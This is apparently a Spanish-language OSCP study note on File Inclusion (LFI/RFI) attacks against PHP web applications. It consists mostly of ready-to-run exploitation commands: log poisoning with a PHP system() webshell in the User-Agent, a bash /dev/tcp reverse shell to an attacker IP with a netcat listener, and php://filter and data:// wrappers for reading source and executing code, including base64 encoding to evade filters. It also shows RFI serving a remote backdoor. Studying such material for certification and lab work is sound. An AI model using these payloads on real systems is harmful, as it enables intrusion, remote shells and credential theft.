---
tipo: tecnica
fase: explotacion
so: 
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# File Inclusion (LFI / RFI)

> [!abstract] Qué es y cuándo usarla
> A diferencia de [[Directory Traversal]] (solo lee), la inclusion **incluye el fichero en el código en ejecución** → si contiene código ejecutable, **se ejecuta**. **LFI** = ficheros locales del servidor; **RFI** = ficheros remotos (HTTP/SMB). Objetivo típico: **RCE / reverse shell**. Se descubre igual que traversal (parámetros que apuntan a ficheros).

## LFI → RCE por Log Poisoning
Escribir código en un fichero que controlamos (log) y luego **incluirlo** vía LFI.

```bash
# 1) ver qué guarda el log (el User-Agent se registra)
curl "http://target/index.php?page=../../../../../../../../../var/log/apache2/access.log"
```
2) Con Burp/Repeater, poner en el **User-Agent** el snippet PHP:
```php
<?php echo system($_GET['cmd']); ?>
```
3) Incluir el log y pasar el comando (`&` separa params; borra el UA malicioso para no re-envenenar):
```
page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```

> [!warning] El espacio rompe el comando. Usa **URL encoding** (`ls%20-la`) o **IFS**. Para reverse shell, `system` puede usar `sh` (no Bash) → envuelve:
> ```bash
> bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
> ```
> URL-encoded en `cmd`, con `nc -nvlp 4444` escuchando.

Windows: mismo snippet (la función `system` es agnóstica); cambian rutas de log (XAMPP: `C:\xampp\apache\logs\`). También aplica a Perl, ASP/ASPX, JSP, Node.js (cambia el lenguaje del snippet).

## PHP wrappers
```bash
# php://filter -> LEER el source de un .php sin ejecutarlo (base64)
curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
echo "<base64>" | base64 -d          # revela creds, lógica, etc.

# data:// -> EJECUTAR código embebido (requiere allow_url_include=On)
curl "http://target/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64      # para saltar filtros de "system"
curl "http://target/index.php?page=data://text/plain;base64,<base64>&cmd=ls"
```
| Wrapper | Uso |
|---|---|
| `php://filter/convert.base64-encode/resource=FILE` | Leer source (incluye .php) en base64 |
| `data://text/plain,` / `;base64,` | Ejecutar PHP embebido |

## RFI (Remote File Inclusion)
Requiere `allow_url_include=On` (off por defecto en PHP moderno). Incluye una webshell **remota**:
```bash
python3 -m http.server 80            # servir /usr/share/webshells/php/simple-backdoor.php
curl "http://target/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

> [!warning] Detección / problemas
> - Confunde fácil con traversal: si al incluir un `.php` ves el **HTML renderizado / se ejecuta**, es LFI (no traversal).
> - `data://` y RFI dependen de `allow_url_include` → suele estar deshabilitado.
> - Log poisoning genera entradas visibles en logs (ruidoso).

## Visto en
- Módulo: [[09 - Common Web Application Attacks]]
- Cheatsheet: [[Web]] · [[Explotacion y Shells]]
- Máquinas: [[]]
